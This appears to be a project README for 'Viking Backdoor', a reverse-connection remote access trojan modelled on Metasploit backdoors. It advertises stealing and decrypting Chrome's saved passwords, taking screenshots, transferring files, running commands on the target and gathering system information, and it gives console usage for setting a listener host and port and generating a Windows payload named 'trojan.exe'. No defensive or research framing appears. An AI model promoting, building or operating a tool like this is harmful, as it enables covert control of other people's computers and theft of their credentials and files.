# Viking Backdoor

#### Viking Backdoor project started!

Viking Backdoor is MSF Backdoor like reverse connection tool.

## Features
- File upload.
- File download.
- Taking screenshots.
- Get Chrome's passwords.
- Executing programs / commands in a new process.
- Sending pop-up messages.
- Get some info about target system.


### vkng Help
	Commands:
	    set HOST           : Set HOST value.
	    set PORT           : Set PORT value.
	    settings           : Show HOST and PORT values.
	    start listener     : Start Listener.

	Example:
	    >>> vkng => set HOST 127.0.0.1
	    >>> vkng => set PORT 8000
	    >>> vkng => show options
	[~] HOST: 127.0.0.1
	[~] PORT: 8000
	===========================================================
	    >>> vkng ==> start listener / start / run

	#---- Generating exe files(Windows)

	    >>> vkng => set HOST 127.0.0.1
	    >>> vkng => set PORT 8000
	    >>> vkng => show listener
	[~] HOST: 127.0.0.1
	[~] PORT: 8000
	===========================================================
	    >>> vkng => generate exec --name trojan.exe"""
	    

### Listener Help

	Commands:
		help()                  : Show this message.
		screenshot()            : Take a screenshot on client and send image to server.
		chrome_db               : Download Chrome's password database and decrypt it.
		download                : Download files from client.
		upload                  : Upload files to client from server.
		message TEXT            : Show messages on target system.
		info()                  : Show target system's info.
		execute PROGRAM ARGS    : Execute programs in a new process.

	Execute programs on local machine:
		:dir ==> with ":"
		:cls
		:clear
